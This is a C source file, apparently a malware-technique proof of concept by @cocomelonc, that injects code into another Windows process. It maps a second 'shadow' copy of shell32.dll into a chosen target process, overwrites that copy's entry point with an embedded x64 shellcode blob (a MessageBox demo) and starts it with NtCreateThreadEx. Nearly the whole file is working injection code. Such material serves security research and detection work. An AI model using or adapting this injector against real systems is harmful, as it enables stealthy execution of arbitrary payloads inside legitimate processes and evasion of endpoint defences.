/* 
 * hack3.c
 * technique: Remote Double Loading & Module Stomping
 * this code maps a second "shadow" copy of shell32.dll into a remote process,
 * overwrites its EntryPoint with shellcode, and executes it.
 * for remote process with address verification
 * author: @cocomelonc
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

#define TARGET_DLL  L"C:\\Windows\\System32\\shell32.dll"
#define STATUS_SUCCESS  0x00000000
#define NT_SUCCESS(STATUS)  (((NTSTATUS)(STATUS)) >= STATUS_SUCCESS)

// --- native API Structures ---
typedef enum _SECTION_INHERIT {
  ViewShare = 1,
  ViewUnmap = 2
} SECTION_INHERIT;

typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
  ULONG Length;
  HANDLE RootDirectory;
  PUNICODE_STRING ObjectName;
  ULONG Attributes;
  PVOID SecurityDescriptor;
  PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _PS_ATTRIBUTE_LIST {
  SIZE_T TotalLength;
  ULONG_PTR Attributes[2]; // Simplified for this example
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

// --- native API Function Pointers ---
typedef NTSTATUS(NTAPI* fnNtCreateSection)(
  OUT PHANDLE SectionHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
  IN PLARGE_INTEGER MaximumSize OPTIONAL,
  IN ULONG SectionPageProtection,
  IN ULONG AllocationAttributes,
  IN HANDLE FileHandle OPTIONAL
  );

typedef NTSTATUS(NTAPI* fnNtMapViewOfSection)(
  IN HANDLE SectionHandle,
  IN HANDLE ProcessHandle,
  IN OUT PVOID* BaseAddress,
  IN SIZE_T ZeroBits,
  IN SIZE_T CommitSize,
  IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
  IN OUT PSIZE_T ViewSize,
  IN SECTION_INHERIT InheritDisposition,
  IN ULONG AllocationType,
  IN ULONG Protect
  );

typedef NTSTATUS(NTAPI* fnNtCreateThreadEx)(
  PHANDLE ThreadHandle,
  ACCESS_MASK DesiredAccess,
  POBJECT_ATTRIBUTES ObjectAttributes,
  HANDLE ProcessHandle,
  PVOID StartRoutine,
  PVOID Argument,
  ULONG CreateFlags,
  SIZE_T ZeroBits,
  SIZE_T StackSize,
  SIZE_T MaximumStackSize,
  PPS_ATTRIBUTE_LIST AttributeList
  );

// --- helper Functions ---

// finds PID by process name
DWORD findMyProc(const char* procname) {
  HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
  PROCESSENTRY32 pe;
  pe.dwSize = sizeof(PROCESSENTRY32);
  if (Process32First(hSnapshot, &pe)) {
    do {
      if (_stricmp(procname, pe.szExeFile) == 0) {
        CloseHandle(hSnapshot);
        return pe.th32ProcessID;
      }
    } while (Process32Next(hSnapshot, &pe));
  }
  CloseHandle(hSnapshot);
  return 0;
}

// finds the base address of a module already loaded in a remote process
PVOID GetRemoteModuleBase(DWORD pid, const char* modName) {
  HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
  if (hSnap == INVALID_HANDLE_VALUE) return NULL;
  MODULEENTRY32 me;
  me.dwSize = sizeof(me);
  if (Module32First(hSnap, &me)) {
    do {
      if (_stricmp(me.szModule, modName) == 0) {
        CloseHandle(hSnap);
        return (PVOID)me.modBaseAddr;
      }
    } while (Module32Next(hSnap, &me));
  }
  CloseHandle(hSnap);
  return NULL;
}

// x64 shellcode (MessageBox "Hello world" / calc.exe)
unsigned char shellcode[] =
"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

int main(int argc, char* argv[]) {
  if (argc < 2) {
    printf("Usage: %s <process_name.exe>\n", argv[0]);
    return -1;
  }

  DWORD pid = findMyProc(argv[1]);
  if (pid == 0) {
    printf("[-] Could not find process %s\n", argv[1]);
    return -1;
  }

  // check current (original) shell32.dll address in remote process
  PVOID originalBase = GetRemoteModuleBase(pid, "shell32.dll");
  printf("[+] Original shell32.dll base in PID %d: 0x%p\n", pid, originalBase);
  printf("[*] Press <Enter> to continue...\n");
  getchar();

  // resolve Native APIs
  HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
  fnNtCreateSection pNtCreateSection = (fnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
  fnNtMapViewOfSection pNtMapViewOfSection = (fnNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
  fnNtCreateThreadEx pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

  // open remote process and file
  HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
  HANDLE hFile = CreateFileW(TARGET_DLL, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hFile == INVALID_HANDLE_VALUE) {
    printf("[-] CreateFileW failed: %d\n", GetLastError());
    return -1;
  }

  // create section (SEC_IMAGE)
  HANDLE hSection = NULL;
  NTSTATUS STATUS = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
  CloseHandle(hFile);
  if (!NT_SUCCESS(STATUS)) {
    printf("[-] NtCreateSection failed: 0x%0.8X\n", STATUS);
    return -1;
  }

  // map the section into REMOTE process (Double Loading)
  // important: uMappedModuleRemote must be NULL so OS picks a new address
  PVOID uMappedModuleRemote = NULL; 
  SIZE_T sViewSize = 0;
  STATUS = pNtMapViewOfSection(hSection, hProcess, &uMappedModuleRemote, 0, 0, NULL, &sViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);
  if (!NT_SUCCESS(STATUS)) {
    printf("[-] NtMapViewOfSection failed: 0x%0.8X\n", STATUS);
    return -1;
  }

  printf("[+] Shadow copy mapped at: 0x%p\n", uMappedModuleRemote);

  if (uMappedModuleRemote == originalBase) {
    printf("[!] Warning: New copy landed on the same address. Stomping will corrupt the original DLL!\n");
  } else {
    printf("[+] SUCCESS: Shadow copy is at a different address than original.\n");
  }
  printf("[*] Press <Enter> to continue...\n");
  getchar();

  // calculate EntryPoint Offset locally
  PVOID uMappedModuleLocal = NULL;
  SIZE_T sLocalViewSize = 0;
  pNtMapViewOfSection(hSection, (HANDLE)-1, &uMappedModuleLocal, 0, 0, NULL, &sLocalViewSize, ViewShare, 0, PAGE_READONLY);
  
  PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)((ULONG_PTR)uMappedModuleLocal + ((PIMAGE_DOS_HEADER)uMappedModuleLocal)->e_lfanew);
  DWORD dwEntryPointOffset = pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;
  UnmapViewOfFile(uMappedModuleLocal);

  ULONG_PTR uRemoteEntryPoint = (ULONG_PTR)uMappedModuleRemote + dwEntryPointOffset;
  printf("[+] Target remote EntryPoint: 0x%p\n", (PVOID)uRemoteEntryPoint);

  // stomping: Write shellcode into the shadow copy's EntryPoint
  printf("[*] Press <Enter> to stomp...\n");
  getchar();

  DWORD dwOldProtect;
  if (!VirtualProtectEx(hProcess, (LPVOID)uRemoteEntryPoint, sizeof(shellcode), PAGE_READWRITE, &dwOldProtect)) {
    printf("[-] VirtualProtectEx failed: %d\n", GetLastError());
    return -1;
  }

  if (!WriteProcessMemory(hProcess, (LPVOID)uRemoteEntryPoint, shellcode, sizeof(shellcode), NULL)) {
    printf("[-] WriteProcessMemory failed: %d\n", GetLastError());
    return -1;
  }

  VirtualProtectEx(hProcess, (LPVOID)uRemoteEntryPoint, sizeof(shellcode), dwOldProtect, &dwOldProtect);

  printf("[*] Press <Enter> to execute...\n");
  getchar();

  // execute via NtCreateThreadEx
  HANDLE hThread = NULL;
  STATUS = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (PVOID)uRemoteEntryPoint, NULL, FALSE, 0, 0, 0, NULL);
  
  if (NT_SUCCESS(STATUS)) {
    printf("[+] Thread created! Check your shellcode execution.\n");
    printf("[+] executed thread %d in remote process!\n", GetThreadId(hThread));
    CloseHandle(hThread);
  } else {
    printf("[-] NtCreateThreadEx failed: 0x%0.8X\n", STATUS);
  }

  // cleanup
  CloseHandle(hSection);
  CloseHandle(hProcess);

  return 0;
}